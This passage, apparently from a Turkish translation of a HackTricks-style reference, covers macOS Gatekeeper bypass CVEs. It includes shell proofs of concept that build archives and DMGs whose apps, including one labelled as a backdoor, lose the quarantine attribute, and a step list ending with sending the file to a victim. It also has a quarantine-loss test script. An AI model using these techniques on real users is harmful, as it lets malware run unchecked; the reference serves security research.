# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) göz atın.<sup>[[9]](#references)</sup>

Bunun AppleArchives kullanılarak da istismar edilebileceğini unutmayın:

```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```

### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Bazı macOS dahili sorunları nedeniyle **Google Chrome'un indirilen dosyalara quarantine özniteliğini ayarlamadığı** keşfedildi.<sup>[[10]](#references)</sup>

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble, bir dosyanın özniteliklerini adı `._` ile başlayan ayrı bir dosyada saklar; bu, dosya özniteliklerinin **macOS makineleri arasında** kopyalanmasına yardımcı olur. Ancak bir AppleDouble dosyası açıldıktan sonra `._` ile başlayan dosyaya **quarantine özniteliği atanmıyordu**.<sup>[[11]](#references)</sup>

```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you download and decompress the resulting test.aar, test/._a won't have a quarantine attribute
```

Quarantine attribute ayarlanmamış bir dosya oluşturulabildiğinden, **Gatekeeper'ı bypass etmek mümkündü.** Yöntem, AppleDouble adlandırma kuralını (`._` ile başlatma) kullanarak bir **DMG dosya uygulaması oluşturmak** ve **görünür bir dosyayı, quarantine attribute içermeyen bu gizli dosyaya symlink olarak bağlamaktı.**\
**DMG dosyası çalıştırıldığında**, quarantine attribute içermediği için **Gatekeeper'ı bypass eder.**

```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```

### [CVE-2023-41067]

Apple, iyileştirilmiş kontrollerle macOS Sonoma 14.0'da bir LaunchServices mantık hatasını düzeltti. Kamuya açık güvenlik duyurusunda yalnızca bir uygulamanın Gatekeeper'ı atlatabileceği belirtiliyor; bu nedenle yalnızca CVE kaydına dayanarak belirli bir taşıyıcı biçimi veya exploitation zinciri çıkarsamayın.<sup>[[13]](#references)</sup>

### [CVE-2024-27853]

Mart 2024'te yayımlanan macOS 14.4'teki bir Gatekeeper atlatma açığı, `libarchive`'ın kötü amaçlı ZIP dosyalarını işleme biçiminden kaynaklanıyordu ve uygulamaların değerlendirmeden kaçmasına olanak tanıyordu. Apple'ın sorunu giderdiği 14.4 veya sonraki bir sürüme güncelleyin.<sup>[[1]](#references)</sup>

### [CVE-2024-44128](https://support.apple.com/en-us/121234)

İndirilen bir uygulamaya gömülü **Automator Quick Action workflow**, Gatekeeper değerlendirmesi yapılmadan tetiklenebiliyordu; çünkü workflow'lar veri olarak ele alınıyor ve Automator helper tarafından normal notarization istemi yolunun dışında çalıştırılıyordu. Bu nedenle, bir shell script çalıştıran Quick Action içeren (ör. `Contents/PlugIns/*.workflow/Contents/document.wflow` içinde) hazırlanmış bir `.app`, başlatıldığında hemen çalışabilirdi. Apple, ek bir onay iletişim kutusu ekledi ve Ventura **13.7**, Sonoma **14.7** ve Sequoia **15** sürümlerinde değerlendirme yolunu düzeltti.<sup>[[3]](#references)</sup>

### Çıkarma ve kopyalama sınırlarında karantina yayılımı hataları

2024 tarihli bir çalışma, iZip (ZIP/TAR/7Z), Archiver (ARCHIVER/ZIP/TAR/7Z), BetterZip (ZIP/TAR/7Z), WinRAR (ZIP/TAR/7Z) ve 7z Utility'nin (DMG/ZIP/7Z) test edilen sürümlerinde yayılım boşlukları saptadı; VMware Tools ile ana bilgisayardan sanal makineye yapılan kopyalamalarda da özniteliğin kaybolduğunu gözlemledi. Bazı üreticiler daha sonra düzeltmeler yayımladıklarını duyurdu; bu nedenle bu adları kalıcı bir güvenlik açığı bulunan yazılım listesi olarak değil, **sürüme özgü yeniden testler** için ipuçları olarak değerlendirin. Aynı güven sınırı sorunu yerel Unix iş akışlarında da geçerlidir: `curl`/`scp` karantina eklemez, komut satırındaki `tar`/`unzip` ise bunu bir taşıyıcı arşivden otomatik olarak devralmaz.<sup>[[15]](#references)</sup>

Saldırgan odaklı testlerde, **her** tarayıcı, e-posta istemcisi, arşiv, disk görüntüsü, cloud-sync, paylaşılan klasör ve sanal makine kopyalama geçişinden sonra taşıyıcıyı ve son uygulamayı karşılaştırın. Açık bir `spctl` reddi, eksik bir xattr'ı düzeltmez: karantina yoksa Gatekeeper'ın normal ilk açılış yolu bu değerlendirmeyi hiç istemeyebilir.<sup>[[15]](#references)</sup>

```bash
# 1. Confirm the browser-downloaded carrier is quarantined
xattr -p com.apple.quarantine ./payload.zip

# 2. Extract/copy it through the application under test, then inspect the result
xattr -p com.apple.quarantine ./out/Payload.app || echo "QUARANTINE LOST"
spctl --assess --type execute -vv ./out/Payload.app

# 3. Enumerate every app bundle whose top-level directory lost the marker
find ./out -type d -name '*.app' -prune -exec sh -c \
  'for app do xattr -p com.apple.quarantine "$app" >/dev/null 2>&1 || echo "$app"; done' sh {} +
```

### uchg (bu [konuşmadan](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf))

- Bir uygulama içeren dizin oluşturun.
- Uygulamaya uchg ekleyin.
- Uygulamayı bir tar.gz dosyasına sıkıştırın.
- tar.gz dosyasını bir kurbana gönderin.
- Kurban tar.gz dosyasını açar ve uygulamayı çalıştırır.
- Gatekeeper uygulamayı denetlemez.<sup>[[12]](#references)</sup>

### Quarantine xattr'ını Önleme

Bir ".app" paketine quarantine xattr eklenmezse, uygulama çalıştırıldığında **Gatekeeper tetiklenmez**.

Genişletilmiş öznitelikleri önleyebilen veya silebilen dosya sistemi, bayrak, ACL ve AppleDouble tabanlı temel işlemler için [macOS FS Tricks](macos-fs-tricks/README.md#avoid-quarantine-xattrs-tricks) sayfasına bakın.





## References

- [1] [Apple Platform Security: macOS Sonoma 14.4'ün güvenlik içeriği hakkında (CVE-2024-27853 dahildir)](https://support.apple.com/en-us/HT214084)
- [2] [Eclectic Light: macOS artık uygulamaların kaynağını nasıl izliyor?](https://eclecticlight.co/2023/05/10/how-macos-now-tracks-the-provenance-of-apps/)
- [3] [Apple: macOS Sonoma 14.7 / Ventura 13.7'nin güvenlik içeriği hakkında (CVE-2024-44128)](https://support.apple.com/en-us/121234)
- [4] [MacRumors: macOS 15 Sequoia, Control-tıklama ile “Open” Gatekeeper atlatma yöntemini kaldırıyor](https://www.macrumors.com/2024/08/06/macos-sequoia-gatekeeper-security-change/)
- [5] [WithSecure Labs: CVE-2021-1810'un keşfi](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)
- [6] [CVE-2021-30990, macOS Gatekeeper'ı atlatma](https://ronmasas.com/posts/bypass-macos-gatekeeper)
- [7] [Jamf Threat Labs, Gatekeeper'ın atlatılmasına olanak tanıyan Safari güvenlik açığını belirledi](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)
- [8] [Jamf Threat Labs, Gatekeeper'ın atlatılmasına olanak tanıyan macOS Archive Utility güvenlik açığını belirledi (CVE-2022-32910)](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/)
- [9] [Gatekeeper'ın Aşil topuğu: Bir macOS güvenlik açığının ortaya çıkarılması](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [10] [F-Secure: Gatekeeper atlatma yönteminin keşfi (CVE-2023-27943)](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)
- [11] [Mac Monitor'ın yardımıyla Gatekeeper atlatma açığını bulma ve bildirme](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)
- [12] [CODE BLUE 2023: macOS Güvenlik ve Gizlilik Mekanizmalarını Atlatma — Gatekeeper'dan System Integrity Protection'a (Koh Nakagawa)](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf)
- [13] [Apple: macOS Sonoma 14'ün güvenlik içeriği hakkında (CVE-2023-41067)](https://support.apple.com/en-us/HT213940)
- [14] [Apple Developer Forums: Noter onaylı bir ürünü test etme](https://developer.apple.com/forums/thread/130560)
- [15] [Unit 42: Gatekeeper'ı atlatma — macOS güvenlik mekanizmasındaki zayıflıkları ortaya çıkarma](https://unit42.paloaltonetworks.com/gatekeeper-bypass-macos/)
{{#include ../../../banners/hacktricks-training.md}}
